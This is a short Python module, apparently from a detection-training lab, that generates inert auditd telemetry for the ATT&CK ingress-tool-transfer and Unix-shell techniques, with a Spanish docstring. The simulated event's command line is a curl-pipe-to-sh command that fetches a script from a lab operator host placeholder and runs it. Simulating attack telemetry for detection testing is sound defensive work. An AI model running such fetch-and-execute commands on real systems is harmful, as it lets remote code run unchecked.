# ATT&CK T1105 / T1059.004 - Ingress Tool Transfer / Unix Shell
"""Descarga de un recurso del lab y ejecución inmediata (curl tuberia a shell).

El origen y el destino son el nodo operador del laboratorio. Telemetría inerte:
no se descarga ni ejecuta nada. Dispara `descarga_y_ejecucion`.
"""

from __future__ import annotations

from irlab.telemetria import RED_OPERADOR, Reloj, evento_auditd
from simulations._registro import registrar


@registrar("descarga_ejecucion")
def generar(reloj: Reloj) -> list[dict]:
    cmdline = f"curl http://{RED_OPERADOR}/soporte.sh | sh"
    return [
        evento_auditd(
            reloj,
            exe="/usr/bin/bash",
            cmdline=cmdline,
            key="ejecucion",
            comando="bash",
        )
    ]
